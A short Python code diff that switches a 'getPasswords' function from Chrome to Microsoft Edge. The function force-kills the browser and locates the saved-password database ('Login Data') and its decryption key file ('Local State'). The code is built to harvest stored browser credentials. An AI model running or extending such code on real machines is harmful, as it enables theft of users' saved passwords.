@@ -8,11 +8,11 @@ from utils.ansiColors import RED, RESET
 
 def getPasswords():
     try:
-        os.system("taskkill /F /IM chrome.exe")
+        os.system("taskkill /F /IM msedge.exe")
         os.system('cls' if os.name == 'nt' else 'clear')
 
-        dbPath = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-        keyPath = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
+        dbPath = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+        keyPath = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
 
         if not os.path.exists(dbPath) or not os.path.exists(keyPath):
             print(f"{RED}'Login Data' or 'Local State' file not found.{RESET}")
